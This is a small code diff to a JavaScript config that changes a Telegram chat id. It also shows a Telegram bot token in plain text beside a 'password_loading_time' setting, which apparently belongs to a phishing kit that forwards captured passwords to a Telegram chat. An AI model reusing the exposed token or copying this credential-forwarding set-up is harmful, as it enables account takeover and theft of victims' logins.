@@ -12,7 +12,7 @@ const config = {
 		password_loading_time: 10000,
 	},
 	telegram: {
-		chatid: '5082552949',
+		chatid: '-4507081796',
 		token: '6523989137:AAH5GdE2C0GkBQZV6MtPhJXrmRo8efyp3QE',
 	},
 };
